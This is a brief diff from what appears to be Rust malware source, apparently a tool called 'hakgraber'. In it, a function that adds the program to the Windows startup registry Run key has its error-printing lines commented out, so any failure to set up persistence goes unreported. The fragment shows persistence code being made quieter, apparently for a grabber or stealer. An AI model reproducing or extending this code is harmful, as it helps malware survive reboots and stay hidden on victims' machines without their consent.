@@ -42,8 +42,8 @@ fn _add_to_startup(path: &PathBuf) {
     let sv_result = run_key.set_value("hakgraber", &path.display().to_string());
     if let Err(why) = sv_result {
         //this part is failing for some reason
-        println!("sv result error: ");
-        println!("{}", why);
+        //println!("sv result error: ");
+        //println!("{}", why);
         return;
     }
 
